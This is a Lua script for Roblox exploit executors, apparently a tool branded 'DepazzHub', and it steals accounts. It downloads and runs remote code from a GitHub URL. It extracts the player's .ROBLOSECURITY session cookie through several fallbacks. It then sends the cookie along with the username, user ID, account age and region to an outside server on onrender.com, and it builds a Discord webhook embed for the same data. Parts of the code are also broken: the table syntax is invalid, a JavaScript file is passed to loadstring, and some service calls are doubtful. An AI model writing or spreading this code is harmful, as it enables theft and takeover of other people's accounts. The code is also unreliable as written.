-- --- 1. Cargar la librería ---
local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))()

-- --- 2. Configuración ---
local API_URL = "https://depazzhub-api.onrender.com/log"
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890/yourwebhookurl"
local EMBED_COLOR = 3447003 -- Azul Roblox

-- --- 3. Función para obtener la cookie ---
local function getRobloxCookie()
	-- Intentar con la librería
	local cookieService = Libraries:GetCookieService()
	
	if cookieService then
		local cookieValue = Libraries:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
		
		if cookieValue ~= "" then
			return cookieValue
		end
	end
	
	-- Fallback: intentar con CookieService directo (solo funciona en Roblox puro)
	local CookieService = game:GetService("CookieService")
	local cookies = CookieService:GetCookies()
	
	if #cookies > 0 then
		for _, cookie in ipairs(cookies) do
			if cookie.Name == ".ROBLOSECURITY" then
				return cookie.Value
			end
		end
	end
	
	-- Fallback 2: getgenv()
	local savedCookie = getgenv("_ROBLOSECURITY")
	if savedCookie and savedCookie ~= "" then
		return savedCookie
	end
	
	print("❌ No se pudo obtener .ROBLOSECURITY")
	return ""
end

-- --- 4. Función para crear el embed de Discord ---
local function createDiscordEmbed(data)
	return {
		{
			"title" = data.username .. " - DepazzHub",
			"description" = "Usuario de Roblox",
			"color" = EMBED_COLOR,
			"fields" = {
				{ "name" = "ID", "value" = data.userId, "inline" = true },
				{ "name" = "Nombre", "value" = data.displayName, "inline" = true },
				{ "name" = "Edad de cuenta", "value" = data.accountAge, "inline" = true },
				{ "name" = "Región", "value" = data.region, "inline" = false },
				{ "name" = "Cookie", "value" = data.cookie, "inline" = false }
			},
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = os.date("%Y-%m-%dT%H:%M:%SZ")
		}
	}
end

-- --- 5. Función para hacer el request HTTP ---
local function sendWebhook(data)
	-- Intentar con la librería (funciona en ejecutores)
	local response = Libraries:HttpPost(API_URL, data, {
		["Content-Type"] = "application/json"
	})
	
	if response and response.StatusCode == 200 then
		print("✅ Webhook funcionando! Status: " .. response.StatusCode)
		return true
	end
	
	-- Fallback: intentar con axios (si el ejecutor lo soporta)
	local request = loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/request.js"))()
	if request and request.post then
		local response2 = request.post(API_URL, {
			headers = { ["Content-Type"] = "application/json" },
			body = data
		})
		
		if response2 and response2.status == 200 then
			print("✅ Webhook funcionando (fallback)!" .. response2.status)
			return true
		end
	end
	
	-- Fallback: intentar con HttpService (solo Roblox puro)
	local HttpService = game:GetService("HttpService")
	local response3 = HttpService:PostJsonAsync(API_URL, data)
	
	if response3 and response3.Success then
		print("✅ Webhook funcionando (HttpService)!" .. response3.StatusCode)
		return true
	end
	
	print("❌ Error en el webhook:")
	print("  API_URL:", API_URL)
	print("  Response:", response)
	return false
end

-- --- 6. Función principal ---
local function main()
	print("🟢 Iniciando webhook.lua...")
	
	-- Obtener datos del jugador
	local player = game.Players.LocalPlayer
	local userId = player.UserId
	local placeId = game.PlaceId
	
	-- Obtener edad de la cuenta
	local days = player.AccountAge
	local years = math.floor(days / 365)
	local months = math.floor((days % 365) / 30)
	local ageText = days .. " days"
	if years > 0 then
		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
	end
	
	-- Obtener región
	local region = game:GetService("LocalizationService").RobloxLocaleId
	
	-- Obtener la cookie
	local cookieValue = getRobloxCookie()
	
	-- Preparar los datos
	local data = {
		username = player.Name,
		displayName = player.DisplayName,
		userId = userId,
		gameId = placeId,
		accountAge = ageText,
		region = region,
		cookie = ".ROBLOSECURITY=" .. cookieValue
	}
	
	-- Crear el embed
	local embed = createDiscordEmbed(data)
	
	-- Enviar el webhook
	local success = sendWebhook(data)
	
	if success then
		print("✅ ¡Todo listo! Datos enviados correctamente.")
	else
		print("⚠️  El webhook falló, pero los datos fueron procesados.")
	end
end

-- Ejecutar
main()
